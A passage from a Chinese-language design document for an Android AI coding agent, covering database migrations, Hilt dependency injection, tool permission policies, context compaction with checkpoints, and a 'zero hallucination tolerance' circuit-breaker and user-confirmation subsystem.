  capability TEXT NOT NULL,
  original_degradation_trace_id TEXT NOT NULL,
  original_input_refs_json TEXT NOT NULL,
  final_content_text TEXT NOT NULL,
  hard_constraints_json TEXT NOT NULL,
  user_edited INTEGER NOT NULL,
  confirmed_at_ms INTEGER NOT NULL,
  rerun_count INTEGER NOT NULL DEFAULT 0,
  reused_from_sentinel_id INTEGER,
  card_density TEXT NOT NULL,
  unselected_constraint_ids_json TEXT NOT NULL,
  unselected_reasons_json TEXT,
  hard_constraints_rejected_explicitly INTEGER NOT NULL DEFAULT 0,
  hard_constraint_deleted_with_risk_ack_json TEXT,
  compression_level TEXT,
  compression_tokens_saved INTEGER,
  restorable_checkpoint_ids_json TEXT,
  deleted_messages_trace_json TEXT,
  plan_rejected_count INTEGER NOT NULL DEFAULT 0
);
CREATE INDEX idx_sentinel_session ON user_confirmed_sentinel(session_id);
CREATE INDEX idx_sentinel_trace ON user_confirmed_sentinel(original_degradation_trace_id);
CREATE INDEX idx_sentinel_reuse ON user_confirmed_sentinel(reused_from_sentinel_id);

CREATE TABLE sentinel_plan_rejection_audit (
  id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
  sentinel_id INTEGER NOT NULL,
  rejected_plan_id INTEGER NOT NULL,
  rejected_at_ms INTEGER NOT NULL,
  rejection_reason_text TEXT NOT NULL,
  FOREIGN KEY(sentinel_id) REFERENCES user_confirmed_sentinel(id) ON DELETE CASCADE,
  FOREIGN KEY(rejected_plan_id) REFERENCES plan_approval_entity(id) ON DELETE CASCADE
);
CREATE INDEX idx_spr_sentinel ON sentinel_plan_rejection_audit(sentinel_id);
CREATE INDEX idx_spr_plan ON sentinel_plan_rejection_audit(rejected_plan_id);
```

#### v34→35（3 张审计表 + 熔断表）
```sql
-- 34_zth_v35_3audit_fuse.sql
CREATE TABLE hard_constraint_delete_audit (
  id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
  sentinel_id INTEGER NOT NULL,
  hard_constraint_id TEXT NOT NULL,
  source_layer TEXT NOT NULL,
  source_anchor_id TEXT NOT NULL,
  severity TEXT NOT NULL,
  user_acknowledged_risk INTEGER NOT NULL,
  deleted_at_ms INTEGER NOT NULL,
  FOREIGN KEY(sentinel_id) REFERENCES user_confirmed_sentinel(id) ON DELETE CASCADE
);
CREATE INDEX idx_hcda_sentinel ON hard_constraint_delete_audit(sentinel_id);

CREATE TABLE l0_soft_compact_restore_log (
  id INTEGER PRIMARY KEY AUTOINCREMENT NOT NULL,
  session_id TEXT NOT NULL,
  message_ids_json TEXT NOT NULL,
  restore_type TEXT NOT NULL,
  restored_at_ms INTEGER NOT NULL,
  original_compact_type TEXT NOT NULL
);
CREATE INDEX idx_l0restore_session ON l0_soft_compact_restore_log(session_id);

CREATE TABLE hallucination_fuse_entity (
  session_id TEXT PRIMARY KEY NOT NULL,
  permanently_open INTEGER NOT NULL DEFAULT 0,
  open_events_log_json TEXT NOT NULL DEFAULT '[]'
);
```

#### v36→37（3 张表 13 列 ALTER TABLE）
```sql
-- 36_zth_v37_upgrade_3tables_13cols.sql
-- AgentSessionEntity 5 列
ALTER TABLE chat_sessions ADD COLUMN fuse_score_snapshot INTEGER NOT NULL DEFAULT 0;
ALTER TABLE chat_sessions ADD COLUMN fuse_critical_hits INTEGER NOT NULL DEFAULT 0;
ALTER TABLE chat_sessions ADD COLUMN fuse_state_enum INTEGER NOT NULL DEFAULT 0;
ALTER TABLE chat_sessions ADD COLUMN last_fuse_opened_at_ms INTEGER NOT NULL DEFAULT 0;
ALTER TABLE chat_sessions ADD COLUMN last_fuse_open_reason TEXT;

-- PlanApprovalEntity 4 列
ALTER TABLE plan_approval_entity ADD COLUMN checkpoint_id INTEGER;
ALTER TABLE plan_approval_entity ADD COLUMN rejected_due_to_fuse_open INTEGER NOT NULL DEFAULT 0;
ALTER TABLE plan_approval_entity ADD COLUMN auto_rejected_reason TEXT;
ALTER TABLE plan_approval_entity ADD COLUMN plan_item_source_refs_json TEXT;

-- CheckpointEntity 6 列
ALTER TABLE checkpoint_entity ADD COLUMN fuse_score_at_save INTEGER NOT NULL DEFAULT 0;
ALTER TABLE checkpoint_entity ADD COLUMN fuse_critical_hits_at_save INTEGER NOT NULL DEFAULT 0;
ALTER TABLE checkpoint_entity ADD COLUMN checkpoint_has_critical_hit INTEGER NOT NULL DEFAULT 0;
ALTER TABLE checkpoint_entity ADD COLUMN checkpoint_type TEXT NOT NULL DEFAULT 'MANUAL_USER_SAVE';
ALTER TABLE checkpoint_entity ADD COLUMN pending_card_ids_json TEXT;
ALTER TABLE checkpoint_entity ADD COLUMN pending_plan_approval_id INTEGER;
ALTER TABLE checkpoint_entity ADD COLUMN restored_l0_message_ids_json TEXT;
```

---

## 4. Hilt DI 依赖注入模块

### 4.1 AgentModule 全部 @Provides 清单（412 行）

| 分组 | @Provides 函数 | 返回类型 | Singleton |
|---|---|---|---|
| **数据库** | provideAgentDatabase | AgentDatabase | ✅ 双阶段构建兜底 |
| | provideCheckpointDao | CheckpointDao | ✅ |
| | provideAgentMessageDao | AgentMessageDao | ✅ |
| | provideChatSessionDao | ChatSessionDao | ✅ |
| | provideAIProviderDao | AIProviderDao | ✅ |
| | provideRemoteConnectionDao | RemoteConnectionDao | ✅ |
| | provideTodoItemDao | TodoItemDao | ✅ |
| | provideGitCredentialDao | GitCredentialDao | ✅ |
| | provideCredentialEncryptionStateDao | CredentialEncryptionStateDao | ✅ |
| | provideRemoteAuditLogDao | RemoteAuditLogDao | ✅ |
| | provideModelCapabilityOverrideDao | ModelCapabilityOverrideDao | ✅ |
| **网络** | provideOkHttpClient | OkHttpClient | ✅ 120s/120s/120s |
| | provideOpenAIRetrofit (@Named) | Retrofit | ✅ |
| | provideAnthropicRetrofit (@Named) | Retrofit | ✅ |
| | provideGeminiRetrofit (@Named) | Retrofit | ✅ |
| | provideOpenAIApi | OpenAIApi | ✅ |
| | provideAnthropicApi | AnthropicApi | ✅ |
| | provideGeminiApi | GeminiApi | ✅ |
| **引擎委托** | provideCommandEngine | CommandEngine (DelegatingCommandEngine) | ✅ |
| | provideFileAccess | FileAccessProvider (DelegatingFileAccess) | ✅ |
| | provideTerminalSessionProvider | TerminalSessionProvider | ✅ |
| | provideDelegatingTerminalSessionProvider | DelegatingTerminalSessionProvider | ✅ |
| | provideRemoteSftpFileAccess | RemoteSftpFileAccess | ✅ |
| **工具注册** | provideToolRegistry | ToolRegistry | ✅ 15 工具注册 |
| **工作流** | provideCodeChangeTracker | CodeChangeTracker | ✅ |
| | **provideAgentWorkflow** | AgentWorkflow (StatefulAgentWorkflow) | ✅ 19 参数注入 |

### 4.2 双阶段 DB 构建兜底机制详解

```
Application.onCreate
  └─ Hilt component 构建
      └─ AgentModule.provideAgentDatabase()  ← 任何 Throwable → 进程直接被杀（无弹窗）
          │
          ├─ 第 0 层：runCatching { provideAgentDatabaseInternal() }
          │   任何 Throwable（包括 NoClassDefFoundError / ExceptionInInitializerError）
          │   → fallbackToDestructiveMigration() 终极重建（历史数据全丢但能启动）
          │   → 再失败 → 抛 RuntimeException（经 CrashHandler 落日志）
          │
          └─ provideAgentDatabaseInternal()
              ├─ 第一阶段：buildAgentDatabase(destructiveFallback=false)
              │   走 Migration + fallbackToDestructiveMigration(dropAllTables=false)
              │   （只删未知表，保留业务表的保守降级）
              │   成功 → 返回
              │   失败（常见：migration 32 schema 校验 IllegalStateException）
              │       → FileLogger 记录原因
              └─ 第二阶段：buildAgentDatabase(destructiveFallback=true)
                      fallbackToDestructiveMigration()（全表彻底重建）
```

### 4.3 ZthModule 扩展设计（新增 Hilt Module）

```kotlin
// 新增文件：com/R/codecore/di/ZthModule.kt
@Module
@InstallIn(SingletonComponent::class)
object ZthModule {

    // ====== 第一层：通用能力路由管线 ======
    @Provides @Singleton
    fun provideCapabilityDetector(): CapabilityDetector = CapabilityDetector()

    @Provides @Singleton
    fun provideFailureClassifier(): FailureClassifier = FailureClassifier()

    @Provides @Singleton
    fun provideHallucinationClassifier(): HallucinationClassifier = HallucinationClassifier()

    @Provides @Singleton
    fun provideZthDecisionMatrix(): ZthDecisionMatrix = ZthDecisionMatrix()

    @Provides @Singleton
    fun provideResolverResolver(
        modelMetadataService: ModelMetadataService,
        visionRepo: VisionModelSettingsRepository,
        compactionRepo: CompactionModelSettingsRepository,
        aiProviderRepo: AIProviderRepository
    ): ResolverResolver = ResolverResolver(modelMetadataService, visionRepo, compactionRepo, aiProviderRepo)

    @Provides @Singleton
    fun provideDegradationChainExecutor(
        detector: CapabilityDetector,
        classifier: FailureClassifier,
        hallucination: HallucinationClassifier,
        matrix: ZthDecisionMatrix,
        resolver: ResolverResolver,
        cardVmFactory: ZthConfirmationCardViewModel.Factory
    ): DegradationChainExecutor = DegradationChainExecutor(detector, classifier, hallucination, matrix, resolver, cardVmFactory)

    // ====== 第二层：多级保真压缩 ======
    @Provides @Singleton
    fun provideL0SoftCompactor(): L0SoftCompactor = L0SoftCompactor()

    @Provides @Singleton
    fun provideL1SelectiveCompactor(
        resolverResolver: ResolverResolver
    ): L1SelectiveCompactor = L1SelectiveCompactor(resolverResolver)

    @Provides @Singleton
    fun provideL2FullFidelityCompactor(
        resolverResolver: ResolverResolver
    ): L2FullFidelityCompactor = L2FullFidelityCompactor(resolverResolver)

    @Provides @Singleton
    fun provideLostHardConstraintMatcher(params: ZthParamsRepository): LostHardConstraintMatcher =
        LostHardConstraintMatcher(params)

    @Provides @Singleton
    fun provideConstraintBidirectionalLinker(
        sentinelDao: UserConfirmedSentinelDao,
        checkpointDao: CheckpointDao,
        l0RestoreLogDao: L0SoftCompactRestoreLogDao
    ): ConstraintBidirectionalLinker = ConstraintBidirectionalLinker(sentinelDao, checkpointDao, l0RestoreLogDao)

    @Provides @Singleton
    fun provideCompactionPipeline(
        l0: L0SoftCompactor,
        l1: L1SelectiveCompactor,
        l2: L2FullFidelityCompactor,
        matcher: LostHardConstraintMatcher,
        linker: ConstraintBidirectionalLinker,
        checkpointDao: CheckpointDao,
        cardVmFactory: ZthConfirmationCardViewModel.Factory
    ): CompactionPipeline = CompactionPipeline(l0, l1, l2, matcher, linker, checkpointDao, cardVmFactory)

    // ====== 第三层：四方联动 ======
    @Provides @Singleton
    fun provideHallucinationCircuitBreaker(
        sessionDao: ChatSessionDao,
        fuseDao: HallucinationFuseDao,
        checkpointDao: CheckpointDao
    ): HallucinationCircuitBreaker = HallucinationCircuitBreaker(sessionDao, fuseDao, checkpointDao)

    @Provides @Singleton
    fun providePlanRejectionSentinelMarker(
        sentinelDao: UserConfirmedSentinelDao,
        auditDao: SentinelPlanRejectionAuditDao
    ): PlanRejectionSentinelMarker = PlanRejectionSentinelMarker(sentinelDao, auditDao)

    @Provides @Singleton
    fun provideFuseOpenGlobalCoordinator(
        application: Application,
        planManager: PlanApprovalManager
    ): FuseOpenGlobalCoordinator = FuseOpenGlobalCoordinator(application, planManager)

    @Provides @Singleton
    fun provideCheckpointRevertCoordinator(
        checkpointManager: CheckpointManager,
        planManager: PlanApprovalManager
    ): CheckpointRevertCoordinator = CheckpointRevertCoordinator(checkpointManager, planManager)

    @Provides @Singleton
    fun providePlanItemSourceAttacher(): PlanItemSourceAttacher = PlanItemSourceAttacher()

    @Provides @Singleton
    fun provideLinkInvViolationRecovery(): LinkInvViolationRecovery = LinkInvViolationRecovery()

    // ====== DataStore Repository ======
    @Provides @Singleton
    fun provideChainSpecsRepository(@ApplicationContext ctx: Context): ChainSpecsRepository =
        ChainSpecsRepository(ctx)

    @Provides @Singleton
    fun provideZthParamsRepository(@ApplicationContext ctx: Context): ZthParamsRepository =
        ZthParamsRepository(ctx)

    // ====== LLM 消息过滤器 ======
    @Provides @Singleton
    fun provideZthLlmMessageBuilder(
        sentinelDao: UserConfirmedSentinelDao
    ): ZthLlmMessageBuilder = ZthLlmMessageBuilder(sentinelDao)

    // ====== 门面类（推荐：StatefulAgentWorkflow 只注入这一个，减少参数）======
    @Provides @Singleton
    fun provideZthFacade(
        capabilityDetector: CapabilityDetector,
        chainExecutor: DegradationChainExecutor,
        compactionPipeline: CompactionPipeline,
        circuitBreaker: HallucinationCircuitBreaker,
        planRejectionMarker: PlanRejectionSentinelMarker,
        fuseCoordinator: FuseOpenGlobalCoordinator,
        revertCoordinator: CheckpointRevertCoordinator,
        sourceAttacher: PlanItemSourceAttacher,
        linkRecovery: LinkInvViolationRecovery,
        messageBuilder: ZthLlmMessageBuilder,
        failureClassifier: FailureClassifier,
        hallucinationClassifier: HallucinationClassifier
    ): ZthFacade = ZthFacade(
        capabilityDetector, chainExecutor, compactionPipeline, circuitBreaker,
        planRejectionMarker, fuseCoordinator, revertCoordinator, sourceAttacher,
        linkRecovery, messageBuilder, failureClassifier, hallucinationClassifier
    )
}
```

**AgentModule.provideAgentWorkflow 参数简化（推荐方案）**：

```kotlin
// 改造前：19 个参数
// 改造后：+1 个 ZthFacade（替换需直接调用的子系统参数）
@Provides @Singleton
fun provideAgentWorkflow(
    // ... 保留 toolRegistry / API / prompt / permission / useCase / checkpointManager 等 12 个 ...
    compatibilityPolicyRepository: CompatibilityPolicyRepository,
    zthFacade: ZthFacade  // ← 新增：ZTH 所有子系统通过这一个门面访问
): AgentWorkflow {
    return StatefulAgentWorkflow(
        // ... 其他参数 ...
        compatibilityPolicyRepository,
        zthFacade  // ← 传入
    )
}
```

---

## 5. 工具系统与权限

### 5.1 ToolRegistry 15 个工具注册（AgentModule 323~361 行）

| 注册名 | 实现类 | Permission Policy | 能力 Capabilities | 是否 Contextual |
|---|---|---|---|---|
| `readFile` | ReadFileTool | AUTO_APPROVE | READ_FILESYSTEM | ✅ AbstractContextualTool |
| `writeFile` | WriteFileTool | USER_CONFIRM | WRITE_FILESYSTEM | ✅ |
| `editFile` | EditFileTool | USER_CONFIRM | WRITE_FILESYSTEM | ✅ |
| `sendFile` | SendFileTool | USER_CONFIRM | SEND_FILE, USER_INTERACTION | ✅ |
| `viewImage` | ViewImageTool | AUTO_APPROVE | READ_FILESYSTEM | ✅ |
| `Bash` | ExecuteCommandTool | USER_CONFIRM | EXECUTE_CODE, CONTAINER | ✅ |
| `terminal` | TerminalSessionTool | USER_CONFIRM | EXECUTE_CODE, CONTAINER | ✅ |
| `list` | ListFilesTool | AUTO_APPROVE | READ_FILESYSTEM | ✅ |
| `search` | SearchCodeTool | AUTO_APPROVE | READ_FILESYSTEM, SEARCH_CODE | ✅ |
| `loadSkill` | LoadSkillTool | USER_CONFIRM | MODIFY_AGENT_CONFIG | ✅ |
| `askUserQuestion` | AskUserQuestionTool | AUTO_APPROVE | USER_INTERACTION | ❌（非 contextual，内部走 AskUserQuestionManager 阻塞） |
| `manageMcp` | ManageMcpTool | USER_CONFIRM | MODIFY_AGENT_CONFIG | ✅ |
| `websearch` | WebSearchTool | AUTO_APPROVE | WEB_ACCESS | ✅ |
| `webfetch` | WebFetchTool | AUTO_APPROVE | WEB_ACCESS | ✅ |
| `switchMode` | SwitchModeTool | USER_CONFIRM | MODIFY_AGENT_CONFIG | ✅ |
| `todo` | TodoTool | AUTO_APPROVE | MODIFY_AGENT_CONFIG | ✅ |
| `memory` | MemoryTool | AUTO_APPROVE | READ/MODIFY_AGENT_CONFIG | ✅ |

### 5.2 AgentTool / AbstractContextualTool 继承体系

```kotlin
// 顶层抽象（ToolRegistry 注册基本单位）
abstract class AgentTool {
    abstract val name: String
    abstract val description: String
    abstract val permissionPolicy: ToolPermissionPolicy
    abstract val capabilities: Set<ToolCapability>
    open val parameters: Map<String, ToolParameter> = emptyMap()

    // 直接执行（大部分工具不支持，抛异常或由子类重写）
    abstract suspend fun execute(args: Map<String, JsonElement>): ToolResult

    // 带上下文执行（StatefulAgentWorkflow 统一走这个）
    open suspend fun executeWithContext(
        args: Map<String, JsonElement>,
        context: AgentContext
    ): ToolResult = execute(args)  // 默认委托给无上下文版本
}

// 仅上下文工具基类（强制 executeWithContext，execute 直接抛 UnsupportedOperationException）
abstract class AbstractContextualTool : AgentTool() {
    final override suspend fun execute(args: Map<String, JsonElement>): ToolResult {
        throw UnsupportedOperationException("${javaClass.simpleName} 只能通过 executeWithContext 执行")
    }
    // 子类只需重写 executeWithContext
}

// 流式工具扩展接口
interface StreamingAgentTool {
    fun executeStream(args: Map<String, JsonElement>, context: AgentContext): Flow<ToolStreamEvent>
}
sealed class ToolStreamEvent {
    data class Progress(val chunk: String)
    data class Completed(val result: ToolResult)
}
```

### 5.3 ToolPermissionManager + PolicyEngine 流程

```
StatefulAgentWorkflow.executeToolCall(call, ctx)
  │
  ├─ 1. policyEngine.resolvePolicy(tool, ctx.mode)
  │   返回：AUTO_APPROVE / USER_CONFIRM / DENY
  │
  ├─ 2a. AUTO_APPROVE → 直接执行
  │
  ├─ 2b. DENY → ToolResult.error("权限不足")
  │
  └─ 2c. USER_CONFIRM → permissionManager.requestPermission(tool, args, ctx)
          ├─ AIAgentViewModel._pendingToolPermission.value = PendingPermissionRequest
          │  → AIChatPanel 渲染 ToolPermissionDialog
          ├─ 用户点「允许/拒绝」→ permissionManager.resolve(PermissionResult)
          │  → CompletableDeferred 唤醒
          └─ 允许 → 执行；拒绝 → ToolResult.userRejected()
```

### 5.4 AskUserQuestionTool 交互卡片（被 ZTH 确认卡片复用机制）

```kotlin
// AskUserQuestionManager 挂起模式（与 PlanApprovalManager 完全同构，可抽公共基类）
@Singleton
class AskUserQuestionManager @Inject constructor() {
    private val _pendingQuestion = MutableStateFlow<PendingQuestion?>(null)
    val pendingQuestion: StateFlow<PendingQuestion?>

    suspend fun askQuestions(questions: List<QuestionDef>): List<UserAnswer> {
        val deferred = CompletableDeferred<List<UserAnswer>>()
        _pendingQuestion.value = PendingQuestion(questions, deferred)
        try { return deferred.await() }
        finally { _pendingQuestion.value = null }
    }

    fun resolve(answers: List<UserAnswer>) {
        currentDeferred?.complete(answers)
    }
}

// ZthConfirmationCardViewModel 采用相同的挂起模式：
// ZthFacade.chainExecutor.execute() → viewModel.suspendAwaitUserConfirm()
//   → suspendCancellableCoroutine { cont -> onConfirmOrCancel = { cont.resume(it) } }
//   → 等待 UI 17 事件驱动 12 状态机到 CONFIRMED/CANCELLED
```

---

## 6. 上下文压缩与检查点

### 6.1 ContextCompactor 现有实现详解（359 行）

**核心流程（compactIfNeeded）**：
```
1. estimateTokens(messages) → totalTokens
2. modelMetadataService.resolve() → contextLimit
3. triggerThreshold = 90% × contextLimit
4. 没超过 → 返回原列表
5. 超过 → splitIndex = selectTailStartIndex()  （按 token 倒推切分点）
6. head = messages[:splitIndex], tail = messages[splitIndex:]
7. 【关键】ToolResult 配对修复：tail 以 ToolResult 开头 → 向前回溯到 AssistantMessage(with toolCalls)
8. 标记 head 所有消息 isCompacted = true  （不删除，数据完整性）
9. 调 DEDICATED_COMPACT_LLM（或无则软压缩）对 head 生成 summary
10. 插入 1 条新 AgentMessage(role=ASSISTANT, isCompactionMarker=true, content=summary)
11. 返回 compactionMarker + tail
```

**ZTH 包装改造（CompactionPipeline 内部保留原 compact 作为 L2 简化路径，但默认走 L0→L1→L2）**：

```kotlin
// CompactionPipeline 单向 L0→L1→L2 升级式状态机
suspend fun compactIfNeeded(
    messages: List<AgentMessage>,
    aiProvider: AIProvider,
    sessionId: String,
    onEvent: suspend (AgentEvent) -> Unit
): List<AgentMessage> {
    val (lvl, ctxLimit) = determineCompactionLevel(messages, aiProvider, paramsSnapshot)
    return when (lvl) {
        NONE -> messages
        L0 -> runL0AndMaybeUpgrade(messages, sessionId, onEvent)   // 4 条断言失败 → 自动升级 L1
        L1 -> runL1AndMaybeUpgrade(messages, sessionId, aiProvider, onEvent)  // 3 闸门失败 → 升级 L2
        L2 -> runL2FullFidelity(messages, sessionId, aiProvider, onEvent)  // 双闸门 + 阻塞卡片
    }
}
```

### 6.2 CheckpointManager 文件快照机制（147 行）

| 函数 | 调用时机 | 说明 |
|---|---|---|
| `createCheckpoint(sessionId, userMessageId, prompt)` | 用户发送新消息时，AIAgentViewModel.processUserInput 开头 | 新建 Checkpoint 节点，写入 DB，setActiveCheckpointId |
| `beforeFileModified(sessionId, filePath)` | WriteFileTool / EditFileTool 将要修改文件前（executeWithContext 第一行） | 当前 Checkpoint 周期内对该文件未快照过 → 保存原始内容到 `filesDir/checkpoints/<sessionId>/<checkpointId>/` |
| `restoreCheckpoint(checkpointId)` | 用户点还原菜单 → CheckpointRevertCoordinator | 逐条还原 CheckpointFileSnapshotEntity 对应文件到原路径 |
| `listCheckpoints(sessionId)` | UI 还原菜单/卡片扩展区 4 | 按时间倒序列出所有检查点，支持过滤类型（L0_PRE/L1_PRE/L2_PRE/FUSE_OPEN/PLAN_APPROVAL/MANUAL） |

**ZTH 新增 checkpoint_type 枚举值**：
```kotlin
enum class CheckpointType {
    MANUAL_USER_SAVE,      // 用户手动保存（原有）
    L0_PRE_COMPACT,        // L0 压缩前自动快照
    L1_PRE_COMPACT,        // L1 压缩前自动快照
    L2_PRE_COMPACT,        // L2 压缩前自动快照
    L2_POST_CONFIRMED,     // L2 卡片用户确认后（还原到压缩后状态用）
    FUSE_OPEN_CRITICAL,    // LINK-INV-4 criticalHits 变化时
    PLAN_APPROVAL_GENERATED // Plan 生成完成审批前
}
```

### 6.3 PlanApprovalManager 计划审查（74 行）

```
SwitchModeTool.executeWithContext()  （PLAN → BUILD 切换请求）
  │
  ├─ 写入 chat_sessions.mode = "BUILD"
  │
  └─ planApprovalManager.awaitApproval(reason, sessionId)
      ├─ _pendingApproval.value = PlanApprovalRequest(reason)
      │  → ChatInputBar.PlanApprovalPanel 渲染
      │     ├─ 用户点「继续完善(REFINE)」→ chat_sessions.mode 回滚 = "PLAN"
      │     │                                          → workflow 继续在 PLAN 模式跑
      │     └─ 用户点「批准并执行(APPROVE)」→ BUILD 模式生效，工具修改权限开
      │
      └─ CompletableDeferred<PlanApprovalChoice> 返回
         → StatefulAgentWorkflow 后续循环根据 APPROVE/REFINE 分支
```

**ZTH LINK-INV-1 扩展**：Plan Reject（用户 REFINE 或 AUTO 因 CB OPEN 拒）时，自动：
1. 找最近 sentinels → 写 SentinelPlanRejectionAudit 行
2. sentinel.planRejectedCount++
3. 下一轮 buildSystemPrompt 对这些 sentinel 自动加 `⚠️ 前缀`

---

## 7. ZTH 零幻觉容忍模式 · 完整模块设计

### 7.1 ZTH 包结构全景（7 子系统 40+ 文件）

```
com.R.codecore.feature.agent.zth
├─ ZthFacade.kt                              ← 门面：StatefulAgentWorkflow 只访问这一个
│
├─ invariants/                                ← 0 章铁律：断言 + 异常
│  ├─ AgentZthInvariants.kt                  12 个 assertZthXxx(state, op) 静态断言
│  └─ ZthInvariantViolationException.kt      (reason, invId) : IllegalStateException
│
├─ capability/                                ← 第一层：通用能力路由管线
│  ├─ detector/
│  │   └─ CapabilityDetector.kt              detect(sessionState, userMsg): Set<RequiredCapability>
│  ├─ classifier/
│  │   ├─ FailureClassifier.kt               classify(e, ctx): FailureClassification
│  │   ├─ FailureKeywordEvidenceTable.kt     6 大类多语言关键字证据表
│  │   └─ HallucinationClassifier.kt         assess(rawOutput, ctx): HallucinationAssessment
│  ├─ executor/
│  │   ├─ DegradationChainExecutor.kt        execute(req): DegradationResult
│  │   ├─ ResolverResolver.kt                resolveResolver(spec, ctx): CallableLLMConfig?
│  │   └─ chain/
│  │       ├─ ChainSpec.kt                    data class + validate()(CSPEC-INV 1~3)
│  │       ├─ ResolverSpec.kt                 data class
│  │       └─ ZthPresetConstants.kt           STRICT/BALANCED⭐/LAX/MANUAL 4 预设
│  └─ decision/
│      ├─ ZthDecisionMatrix.kt               6 FailureClass × 16 SubClass × 10 列
│      └─ DecisionRule.kt                    10 列字段 data class
│
├─ compaction/                                ← 第二层：多级保真压缩
│  ├─ L0SoftCompactor.kt                     4 条自动化断言
│  ├─ L1SelectiveCompactor.kt                Schema 强约束 + 3 闸门
│  ├─ L2FullFidelityCompactor.kt             5 section Schema + 双闸门 + coverageGap
│  ├─ pipeline/
│  │   └─ CompactionPipeline.kt              L0→L1→L2 单向升级式状态机
│  ├─ gap/
│  │   ├─ LostHardConstraintMatcher.kt       2 阶段打分算法（T×0.7+C×0.2+L×0.1）
│  │   ├─ LostHardConstraintItem.kt          data class（whyLost/suggestedPos/severity/sourceAnchor）
│  │   └─ ConstraintBidirectionalLinker.kt   正向插回(GAP-INV-2) + 逆向删除(REV-INV-1)
│  └─ ui/
│      └─ L0TinyIconHandler.kt               [T]/[⊞]/[✅] 渲染 + 点击浮窗 + REV-INV-2 联动
│
├─ linkage/                                   ← 第三层：四方联动状态机
│  ├─ HallucinationCircuitBreaker.kt         6 态 FuseState + addScore + @Transaction 4 写
│  ├─ PlanRejectionSentinelMarker.kt         LINK-INV-1：sentinel 打标 + Planner prompt 前缀
│  ├─ FuseOpenGlobalCoordinator.kt           LINK-INV-2：横幅 + 自动拒 Plan + 自动 Cancel Card
│  ├─ CheckpointRevertCoordinator.kt         LINK-INV-3：还原前先关 Card/Plan
│  ├─ PlanItemSourceAttacher.kt              LINK-INV-5：每条 Plan Item 注入 factSourceRefs
│  └─ recovery/
│      └─ LinkInvViolationRecovery.kt        6 类 LINK_INV_VIOLATION 结构化降级
│
├─ model/
│  ├─ room/entity/                           ← v34/v35 5 张新表（对应第 3 章 SQL）
│  │   ├─ UserConfirmedSentinelEntity.kt     + UserConfirmedSentinelDao
│  │   ├─ SentinelPlanRejectionAudit.kt      + Dao
│  │   ├─ HardConstraintDeleteAudit.kt       + Dao
│  │   ├─ L0SoftCompactRestoreLogEntity.kt   + Dao
│  │   └─ HallucinationFuseEntity.kt         + HallucinationFuseDao
│  ├─ datastore/                             ← Proto DataStore（第 6 章 Proto 定义）
│  │   ├─ CompatibilityChainSpecs.proto
│  │   ├─ ZthParamsSnapshot.proto
│  │   ├─ ChainSpecsRepository.kt            Per-Provider 读写
│  │   ├─ ZthParamsRepository.kt             30 参数读写 + clamp()
│  │   └─ ZthParamRanges.kt                  [min,max] 常量 + clamp() 函数
│  └─ enums/
│      ├─ RequiredCapability.kt              VISION/CONTEXT_COMPACTION/TOOL_RICH/REASONING/STREAMING
│      ├─ FailureClass.kt + FailureSubClass.kt  6 × 16
│      ├─ FuseState.kt                       6 态枚举
│      ├─ CardDensity.kt                     INFO/STANDARD/DETAILED/N_A
│      └─ CheckpointType.kt                  8 个类型（第 6.2 章）
│
├─ ui/compose/
│  ├─ settings/                               ProviderEditor 三段式区块
│  │   ├─ ZthPresetSelector.kt
│  │   ├─ ZthCapabilityChainOverviewCard.kt
│  │   ├─ ZthFuseDashboard.kt
│  │   ├─ ZthResolverEditorSheet.kt           MANUAL 档 BottomSheet
│  │   └─ ZthParamsEditorSheet.kt             MANUAL 档 6 Tab 滑条
│  ├─ card/                                   ConfirmationCard 3 模板 + 4 扩展区
│  │   ├─ ZthConfirmationCard.kt              根 Composable
│  │   ├─ ZthConfirmationCardViewModel.kt     17 事件 × 12 状态状态机
│  │   ├─ template/
│  │   │   ├─ ZthCardInfoTemplate.kt
│  │   │   ├─ ZthCardStandardTemplate.kt      左右对比 + 编辑框 + 三按钮
│  │   │   └─ ZthCardDetailedTemplate.kt      分段对照 + checkbox + Trade-off #9 声明项
│  │   └─ compression/
│  │       ├─ ZthCardCompressionHeaderWarning.kt  顶部丢失硬约束黄区
│  │       ├─ ZthCardCompressionDeletionList.kt   删除/摘要清单（行尾恢复按钮）
│  │       ├─ ZthCardCompressionSourceTracker.kt  硬约束来源追踪面板
│  │       └─ ZthCardCompressionRestoreButtons.kt 4 档还原快捷入口
│  └─ global/                                 全局悬浮/横幅/菜单
│      ├─ ZthFuseOpenGlobalBanner.kt          WindowManager 横幅（无关闭按钮）
│      ├─ ZthL0SoftCompactBadge.kt            0-60s 黄条 → 60s+ Toolbar 🗂️
│      └─ ZthRevertCheckpointMenu.kt          聊天页菜单 4 档还原
│
└─ di/
   └─ ZthModule.kt                            Hilt @Provides（对应第 4.3 章）
```

### 7.2 第一层：通用能力路由管线（类/函数精确签名）

#### 7.2.1 枚举定义

```kotlin
// RequiredCapability.kt（能力链 5 条）
enum class RequiredCapability {
    VISION,                  // 识图（链长=2，可降级）
    CONTEXT_COMPACTION,      // 上下文压缩（链长=2，可降级）
    TOOL_RICH,               // 工具调用（链长=1，🛡️ZTH 不可降级）
    REASONING,               // 思考（链长=1，🛡️ZTH 不可降级）
    STREAMING_REALTIME       // 流式输出（链长=2，可降级）
}

// FailureClass.kt + FailureSubClass.kt（决策矩阵 6×16）
enum class FailureClass {
    CAPABILITY_UNSUPPORTED,     // 子类 3：VISION_UNSUPPORTED, TOOL_CALL_UNSUPPORTED, REASONING_UNSUPPORTED
    TRANSIENT_FAILURE,          // 子类 3：RATE_LIMITED_429, SERVER_ERROR_5XX, NETWORK_TIMEOUT
    RESPONSE_FORMAT_INVALID,    // 子类 3：TOOL_CALL_JSON_INVALID, REASONING_TAG_MALFORMED, SSE_FRAME_CORRUPTED
    AUTH_OR_BILLING_FAILURE,    // 子类 3：INVALID_API_KEY, BILLING_QUOTA_EXCEEDED, INSUFFICIENT_SCOPE
    USER_INTERRUPT,             // 子类 2：USER_CLICKED_STOP, SESSION_TERMINATED
    UNCLASSIFIED                // 子类 2：LOW_CONFIDENCE, HIGH_CONF_CAPABILITY
}

// StandardAction.kt（决策矩阵 ④ 标准动作链）
enum class StandardAction {
    RETRY_T0,                // 短退避重试（500ms）
    RETRY_T1,                // 长退避重试（1500ms）
    RUN_FALLBACK1,           // 运行 chainSpec 中 resolver#2（如 DEDICATED_VISION_LLM）
    FORMAT_STRONG_PREFIX,    // 追加格式强约束前缀后重试
    SKIP_TO_CARD             // 直接出卡片（不重试）
}

// TerminalAction.kt（决策矩阵 ⑨⑩ 确认/取消后动作）
enum class TerminalAction {
